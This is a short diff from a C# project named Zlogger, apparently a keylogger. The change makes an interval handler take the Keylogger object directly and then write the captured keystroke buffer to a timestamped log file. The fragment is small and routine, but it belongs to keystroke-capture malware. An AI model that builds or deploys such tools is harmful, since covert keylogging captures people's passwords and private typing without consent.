@@ -34,10 +34,8 @@ namespace Rodjenihm.Zlogger
             }
         }
 
-        public static void HandleIntervalElapsed(object sender, EventArgs e)
+        public static void HandleIntervalElapsed(Keylogger keylogger)
         {
-            var keylogger = sender as Keylogger;
-
             if (keylogger.Buffer.Length > 0)
             {
                 var logName = $"log_{DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss")}.txt";
